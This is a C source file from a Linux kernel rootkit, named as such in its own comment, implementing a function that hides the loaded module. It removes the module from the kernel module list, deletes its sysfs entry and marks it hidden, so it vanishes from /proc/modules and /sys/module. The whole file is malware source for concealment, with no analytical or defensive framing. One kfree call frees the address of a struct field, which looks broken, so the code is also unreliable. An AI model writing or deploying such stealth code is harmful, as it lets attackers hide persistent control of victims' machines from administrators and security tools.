#include "module_hiding.h"
#include "utils.h"

/* pointer to the module entries above the rootkit in /proc/modules and
   /sys/module */
static struct list_head *prev_module;
static struct list_head *prev_kobj_module;

void do_hide_module(void)
{
  /* check if module is already hidden */
  if (module_hidden)
    return;
  
  /* hiding module from procfs view */
  prev_module = THIS_MODULE->list.prev;
  list_del_rcu((void *)&THIS_MODULE->list);
  kfree(&THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  
  /* hiding module from sysfs view */
  prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);

  /* mark the module as hidden */
  module_hidden = (unsigned int)0x1;
}
